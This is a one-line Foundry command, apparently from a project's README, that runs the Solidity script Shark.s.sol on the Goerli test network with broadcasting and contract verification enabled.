forge script script/Shark.s.sol --rpc-url $GOERLI_RPC_URL -vvvv --broadcast --verify
```

